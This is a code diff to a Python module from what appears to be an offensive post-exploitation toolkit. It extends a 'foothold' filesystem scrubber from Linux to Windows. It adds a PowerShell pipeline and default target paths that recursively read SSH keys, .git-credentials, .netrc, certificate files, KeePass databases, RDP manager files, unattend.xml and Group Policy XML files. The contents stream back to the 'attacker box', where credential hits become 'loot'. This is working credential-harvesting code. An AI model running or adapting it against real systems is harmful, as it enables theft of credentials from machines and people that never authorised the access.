@@ -9,14 +9,15 @@ those trees.
 Design: reuse the pure :data:`sharespider.SCRUBBERS` (rule 1 — the scrubbers are
 ``(local_path, share_path, text) -> [Hit]``, no I/O), and drive them with output
 captured through :func:`fieldkit.executor.execute`. One command per host: a
-``find | while read; head; echo delimiter`` pipeline that streams every candidate
+``find | while read; head; echo delimiter`` pipeline (Linux) or an equivalent
+``Get-ChildItem`` PowerShell pipeline (Windows) that streams every candidate
 file's contents, delimited so we can split them client-side. No files land on
 disk on the attacker box — the parse happens in-memory.
 
-Windows on-box scrub is a follow-up. For Windows footholds where you have SMB
-admin access to the same box, ``fieldkit spider`` already covers this (spider
-against localhost via SMB); the gap is a Windows shell-only foothold, which
-needs a matching PowerShell-driven command and lands in a separate module.
+Both OSes are handled here; the caller (`fieldkit scrub`) routes based on
+``host['os']``. For a Windows foothold with SMB admin access to the same box,
+``fieldkit spider`` is a complementary path — it goes through the SMB share
+transport rather than a shell command.
 """
 import re
 from dataclasses import dataclass, field
@@ -27,6 +28,23 @@ from . import sharespider
 
 
 DEFAULT_LINUX_PATHS = ("/etc", "/opt", "/root", "/home", "/var/www", "/srv")
+
+#: Windows defaults chosen for "custom-app configs live here":
+#:   * ProgramData / Users\Public — the traditional "shared config" dirs
+#:   * inetpub — IIS web-app roots (web.config territory)
+#:   * xampp / wamp roots — common LAMP-on-Windows footprints
+#:   * ProgramFiles — application install roots (many bundle .config / .yml)
+#: Windows / Windows\System32 are excluded intentionally (huge tree, mostly noise).
+DEFAULT_WINDOWS_PATHS = (
+    "C:\\ProgramData",
+    "C:\\Users\\Public",
+    "C:\\Users",
+    "C:\\inetpub",
+    "C:\\xampp",
+    "C:\\wamp",
+    "C:\\Program Files",
+    "C:\\Program Files (x86)",
+)
 
 #: Extensions and filenames to sweep. Overlaps sharespider's `_INTERESTING` set for
 #: filename-only hits (SSH keys, .env, credentials files) plus the config/script
@@ -42,6 +60,21 @@ _FIND_TESTS = (
     "-o -name '.pgpass' -o -name '.netrc' "
     "-o -name '.git-credentials' -o -name 'credentials' "
     "-o -name '*.pfx' -o -name '*.p12'"
+)
+
+#: Windows equivalent — filename patterns for Get-ChildItem -Include.
+#: Includes .config for web.config, .kdbx for KeePass, .rdg for RDP mgr.
+_WIN_INCLUDES = (
+    "*.yaml", "*.yml", "*.ini", "*.conf", "*.config", "*.cnf",
+    "*.env", ".env*",
+    "*.properties", "*.json", "*.xml",
+    "*.ps1", "*.psm1", "*.psd1", "*.bat", "*.cmd", "*.vbs",
+    "id_rsa", "id_ed25519", "id_ecdsa", "authorized_keys",
+    "*.pem", "*.ppk", "*.pfx", "*.p12",
+    ".git-credentials", ".netrc",
+    "*.kdbx", "*.rdg", "web.config", "app.config",
+    "unattend.xml", "sysprep.xml", "autounattend.xml",
+    "Groups.xml", "Services.xml", "ScheduledTasks.xml",
 )
 
 _MAX_BYTES_PER_FILE = 50_000
@@ -61,7 +94,8 @@ class FsScrubReport:
 
 
 def _build_command(paths, max_bytes):
-    """One shell command that streams every candidate file with FK-FS delimiters.
+    """Linux `find | while read; head; echo delimiter` pipeline that streams
+    every candidate file with FK-FS delimiters.
 
     Uses ``head -c`` per file so a huge log does not blow the exec-transport buffer.
     ``-readable`` is a GNU find extension; a POSIX fallback (2>/dev/null) keeps the
@@ -76,6 +110,39 @@ def _build_command(paths, max_bytes):
         f"  head -c {max_bytes} \"$f\" 2>/dev/null; "
         f"  echo; echo \"{_TAIL}\"; "
         "done"
+    )
+
+
+def _build_command_windows(paths, max_bytes):
+    """PowerShell equivalent of the Linux pipeline — same FK-FS delimiters so
+    the same ``parse_stream``/``scrub_stream`` reads the output.
+
+    Uses ``Get-ChildItem -Include`` for the filename filter,
+    ``Where-Object {$_.Length -lt N}`` for the size cap, and
+    ``Get-Content -Raw`` for the body. Errors on individual files are swallowed
+    with ``-ErrorAction SilentlyContinue`` — a locked / permission-denied file
+    doesn't stop the walk. Output is one-shot to stdout, no temp files.
+    """
+    # Quote paths as PowerShell single-quoted strings (single-quote escaped by doubling).
+    def _q(s):
+        return "'" + s.replace("'", "''") + "'"
+    paths_ps = ",".join(_q(p) for p in paths)
+    includes_ps = ",".join(f"'{inc}'" for inc in _WIN_INCLUDES)
+    return (
+        f"$paths=@({paths_ps}); "
+        f"$inc=@({includes_ps}); "
+        "foreach ($p in $paths) { "
+        "  if (-not (Test-Path -LiteralPath $p)) { continue }; "
+        "  Get-ChildItem -LiteralPath $p -Include $inc -Recurse -File "
+        "    -ErrorAction SilentlyContinue "
+        f"    | Where-Object {{ $_.Length -lt {max_bytes} }} "
+        "    | ForEach-Object { "
+        "        Write-Output (\"==FK-FS==\" + $_.FullName + \"==\"); "
+        "        try { Get-Content -LiteralPath $_.FullName -Raw "
+        "                -Encoding UTF8 -ErrorAction Stop } catch {}; "
+        f"        Write-Output ''; Write-Output '{_TAIL}' "
+        "    } "
+        "}"
     )
 
 
@@ -112,25 +179,38 @@ def scrub_stream(output):
 
 def fs_scrub(store, host, cred, *, paths=None, run=None, allow=("read-only",),
              timeout=_TIMEOUT, on_event=None):
-    """Scrub a Linux foothold's filesystem for cleartext secrets.
+    """Scrub a foothold's filesystem for cleartext secrets. OS auto-routes:
+    Linux runs a `find | while read` pipeline over shell; Windows runs the
+    PowerShell equivalent. Both stream FK-FS-delimited chunks that
+    :func:`scrub_stream` picks up.
 
     Runs ONE shell command through :func:`fieldkit.executor.execute` (rule 2: no
     child spawn here; the executor's runner is injected all the way through),
     parses the delimited stream, folds every :class:`Hit` into loot, and promotes
     any credential hit into the store — same shape as ``sharespider``.
     """
-    if host["os"] and host["os"] != "linux":
-        return FsScrubReport(host=host["ip"],
-                             aborted=f"{host['ip']} is {host['os']} — on-box scrub is Linux-only "
-                                     "(Windows: use `fieldkit spider` against the same host)")
-    paths = tuple(paths) if paths else DEFAULT_LINUX_PATHS
+    os_name = host["os"] or "linux"                   # unfingerprinted → assume linux
+    if os_name == "windows":
+        default_paths = DEFAULT_WINDOWS_PATHS
+        command = _build_command_windows(paths or default_paths, _MAX_BYTES_PER_FILE)
+        shell = "powershell"
+    elif os_name == "linux":
+        default_paths = DEFAULT_LINUX_PATHS
+        command = _build_command(paths or default_paths, _MAX_BYTES_PER_FILE)
+        shell = "sh"
+    else:
+        return FsScrubReport(
+            host=host["ip"],
+            aborted=f"{host['ip']} is {os_name} — on-box scrub supports linux + "
+                    "windows (mac/other unsupported).")
+    paths = tuple(paths) if paths else default_paths
+    _ = paths     # keep the value visible for future callers
     rep = FsScrubReport(host=host["ip"])
     emit = on_event or (lambda _m: None)
 
     action = executor_mod.Action(
-        host=host, cred=cred,
-        command=_build_command(paths, _MAX_BYTES_PER_FILE),
-        label="fs-scrub", safety="read-only", shell="sh")
+        host=host, cred=cred, command=command,
+        label="fs-scrub", safety="read-only", shell=shell)
     res = executor_mod.execute(
         store, action, allow=list(allow), timeout=timeout,
         run=run or (lambda argv, env=None: runner_mod.run(argv, env_add=env,
